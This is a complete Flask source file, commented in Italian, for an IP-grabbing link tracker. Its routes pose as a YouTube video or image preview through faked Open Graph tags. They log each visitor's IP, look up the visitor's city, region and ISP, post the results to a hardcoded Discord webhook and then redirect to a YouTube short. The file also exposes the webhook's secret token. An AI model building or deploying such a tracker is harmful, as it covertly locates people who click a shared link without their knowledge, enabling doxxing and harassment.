from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

# TUO WEBHOOK PERSONALE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"

# Immagine da mostrare
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"

def get_real_ip(request):
    """Prende solo l'IP reale del client"""
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    """Ottiene info geolocalizzazione"""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "isp": data.get("isp", "N/D")
                }
    except Exception as e:
        print(f"Errore API: {e}")
    return None

def send_to_discord(ip, ip_info):
    """Invia i dati al webhook"""
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    description = f"**📅 Data:** {date}\n"
    if ip_info:
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')}\n"
        description += f"**📍 Regione:** {ip_info.get('region', 'N/D')}\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}\n"
        description += f"**🔌 ISP:** {ip_info.get('isp', 'N/D')}"
    else:
        description += "**⚠️ Geolocalizzazione non disponibile**"
    
    data = {
        "content": "🔔 **Clic sull'immagine!**",
        "embeds": [{
            "title": f"IP: {ip}",
            "description": description,
            "color": 5814783,
            "timestamp": date
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ Inviato: {ip}")
        else:
            print(f"❌ Errore: {response.status_code}")
    except Exception as e:
        print(f"❌ Eccezione: {e}")

@app.route("/")
def index():
    """Route principale che traccia e reindirizza"""
    ip = get_real_ip(request)
    print(f"🌐 IP reale: {ip}")
    
    ip_info = get_ip_info(ip)
    send_to_discord(ip, ip_info)
    
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

# NUOVA ROUTE: Immagine cliccabile con tracker
@app.route("/img")
@app.route("/image")
@app.route("/photo")
@app.route("/pic")
def image_tracker():
    """Mostra l'immagine e traccia al click"""
    ip = get_real_ip(request)
    print(f"🖼️ IP clic immagine: {ip}")
    
    ip_info = get_ip_info(ip)
    send_to_discord(ip, ip_info)
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questa immagine!">
        <meta property="og:description" content="Clicca per vederla meglio">
        <meta property="og:image" content="{IMAGE_URL}">
        <meta property="og:type" content="website">
        <meta name="twitter:card" content="summary_large_image">
        
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            body {{
                background: #1a1a1a;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                cursor: pointer;
                font-family: Arial, sans-serif;
            }}
            .container {{
                text-align: center;
                padding: 20px;
            }}
            .container img {{
                max-width: 90vw;
                max-height: 80vh;
                border-radius: 10px;
                box-shadow: 0 0 30px rgba(255,255,255,0.1);
                transition: all 0.3s ease;
            }}
            .container img:hover {{
                transform: scale(1.02);
                box-shadow: 0 0 40px rgba(255,255,255,0.2);
            }}
            .container p {{
                color: #888;
                margin-top: 15px;
                font-size: 14px;
            }}
        </style>
    </head>
    <body onclick="redirectToVideo()">
        <div class="container">
            <img src="{IMAGE_URL}" alt="Clicca qui" id="mainImage">
            <p>Clicca sull'immagine per continuare...</p>
        </div>
        
        <script>
            function redirectToVideo() {{
                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
            }}
            
            // Anche cliccando direttamente l'immagine
            document.getElementById('mainImage').addEventListener('click', function(e) {{
                redirectToVideo();
            }});
        </script>
    </body>
    </html>
    """

# Route con anteprima YouTube
@app.route("/video")
@app.route("/shorts")
@app.route("/watch")
@app.route("/yt")
def video_preview():
    """Mostra anteprima YouTube e reindirizza"""
    ip = get_real_ip(request)
    print(f"🎬 IP video: {ip}")
    
    ip_info = get_ip_info(ip)
    send_to_discord(ip, ip_info)
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questo video! 😱">
        <meta property="og:description" content="Devi assolutamente vederlo, è incredibile!">
        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
        <meta property="og:type" content="video.other">
        <meta property="og:site_name" content="YouTube">
        <meta name="twitter:card" content="summary_large_image">
        
        <style>
            body {{
                margin: 0;
                padding: 0;
                background: #0f0f0f;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: Arial, sans-serif;
            }}
            .container {{
                text-align: center;
                color: #fff;
            }}
            .spinner {{
                width: 50px;
                height: 50px;
                border: 4px solid #303030;
                border-top: 4px solid #ff0000;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            p {{
                margin-top: 20px;
                font-size: 16px;
                color: #aaa;
            }}
        </style>
        
        <meta http-equiv="refresh" content="0;url=/">
    </head>
    <body>
        <div class="container">
            <div class="spinner"></div>
            <p>Caricamento video...</p>
        </div>
        <script>
            window.location.href = "/";
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
